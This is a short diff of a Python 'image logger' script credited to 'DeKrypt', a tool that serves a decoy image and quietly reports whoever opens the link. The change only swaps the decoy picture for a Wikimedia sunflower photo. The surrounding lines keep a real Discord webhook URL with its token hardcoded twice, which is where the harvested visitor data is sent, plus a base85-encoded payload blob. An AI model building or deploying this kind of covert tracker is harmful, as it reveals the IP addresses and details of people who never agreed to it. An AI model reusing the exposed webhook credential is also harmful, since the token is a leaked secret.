@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1457288972798656637/yx9pjbyjlNmxlzv99TQfsezooTxiPS7mRX9C9AgXxHJUu8AT2MzRVrVpVTEs0_CzCubZ",
-    "image": "https://i.namu.wiki/i/LBrABVmwlkl6tnhOx1Q_onGTHWEUMc4GjK6KjdV_SGeN3dOpAxPUF7RKOF5CcemhFHE7eT7kiuu0uKgv8pix4A.webp", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/commons/4/41/Sunflower_from_Silesia2.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -84,7 +84,7 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1457288972798656637/yx9pjbyjlNmxlzv99TQfsezooTxiPS7mRX9C9AgXxHJUu8AT2MzRVrVpVTEs0_CzCubZ'
 
-bindata = httpx.get('https://i.namu.wiki/i/LBrABVmwlkl6tnhOx1Q_onGTHWEUMc4GjK6KjdV_SGeN3dOpAxPUF7RKOF5CcemhFHE7eT7kiuu0uKgv8pix4A.webp').content
+bindata = httpx.get('https://upload.wikimedia.org/wikipedia/commons/4/41/Sunflower_from_Silesia2.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
